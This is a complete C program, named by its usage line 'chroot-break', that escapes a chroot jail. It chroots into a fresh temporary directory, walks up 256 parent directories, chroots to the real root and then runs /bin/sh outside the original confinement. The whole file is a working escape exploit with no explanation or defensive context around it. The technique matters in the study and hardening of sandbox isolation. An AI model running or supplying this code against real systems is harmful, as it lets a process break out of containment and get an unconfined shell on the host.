#include <errno.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

extern int errno;

int
main(int argc, char **argv)
{
        int i;
        char dir[] = "tdXXXXXX";

        if (argc != 1) {
                fprintf(stderr, "usage: chroot-break\n");
                exit(1);
        }

        /* Get us to the root of our existing chroot */
        fprintf(stderr, "changing directory to /\n");
        if (chdir("/") == -1) {
                perror("chdir /");
                return 0;
        }

        /* Create a temporary directory */
        fprintf(stderr, "making temporary directory\n");
        if (mkdtemp(dir) == NULL) {
                perror("mkdtemp");
                return 0;
        }

        /* Chroot us into our new temporary chroot */
        fprintf(stderr, "changing directory to %s\n", dir);
        if (chroot(dir) == -1) {
                perror("chroot");
                return 0;
        }

        /* Get us back to the REAL root */
        fprintf(stderr, "popping up to the real /\n");
        for (i = 0; i < 256; i++) {
                if (chdir("..") == -1) {
                        perror("chdir ..");
                        return 0;
                }
        }

        /* Break us out of our old chroot */
        fprintf(stderr, "changing directory to .\n");
        if (chroot(".") == -1) {
                perror("chroot .");
                return 0;
        }

        /* Finally, get us a shell broken out of the chroot */
        fprintf(stderr, "executing /bin/sh\n");
        execl("/bin/sh", "sh", NULL);
        perror("execl");

        return 0;
}